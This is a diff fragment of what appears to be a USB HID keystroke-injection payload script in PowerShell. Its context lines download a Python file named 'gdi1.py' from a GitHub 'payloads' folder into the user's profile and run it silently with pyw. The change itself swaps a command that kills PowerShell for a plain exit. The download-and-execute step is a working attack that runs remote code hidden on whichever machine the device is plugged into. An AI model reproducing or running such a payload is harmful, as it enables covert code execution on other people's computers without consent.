@@ -21,5 +21,4 @@ else {
 
 curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output (Join-Path $env:USERPROFILE 'gdi1.py')
 pyw (Join-Path $env:USERPROFILE 'gdi1.py')
-Start-Sleep 1
-cmd /c "taskkill /IM powershell.exe /F"
+exit
